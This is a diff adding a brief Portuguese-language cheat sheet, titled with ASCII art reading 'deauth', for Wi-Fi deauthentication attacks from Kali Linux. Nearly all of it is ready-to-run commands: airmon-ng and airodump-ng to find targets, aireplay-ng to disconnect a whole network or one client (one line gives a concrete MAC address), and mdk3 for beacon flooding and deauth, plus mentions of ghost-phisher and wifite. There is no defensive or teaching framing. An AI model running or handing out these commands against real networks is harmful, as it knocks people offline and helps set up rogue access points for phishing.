@@ -1,0 +1,23 @@
+       __                             __     __  
+  ____/ /  ___     ____ _   __  __   / /_   / /_ 
+ / __  /  / _ \   / __ `/  / / / /  / __/  / __ \
+/ /_/ /  /  __/  / /_/ /  / /_/ /  / /_   / / / /
+\__,_/   \___/   \__,_/   \__,_/   \__/  /_/ /_/ 
+                                                                
+
+
+1. usando aireplay e airodump
+
+[+] root@kali:~# airmon-ng start wlan0
+[+] root@kali:~# airodump-ng wlan0mon
+[+] root@kali:~# airodump --bssid (bssid) --channel (channel) wlan0mon
+[+] root@kali:~# aireplay-ng -0 0 -a (bssid) wlan0mon ==> rede inteira
+[+] root@kali:~# aireplay-ng -0 0 -a 1c:a5:32:1c:5b:F4 -c (station) wlan0mon ==> cliente especifico
+
+2. usando mdk3
+
+[+] root@kali:~# mdk3 wlan0mon b -m -k -c 1 -s 1000 ==> flood de bssid
+[+] root@kali:~# mdk3 wlan0mon d -c (canal) ==> deauth
+
+3. ghost-phisher
+4. wifite
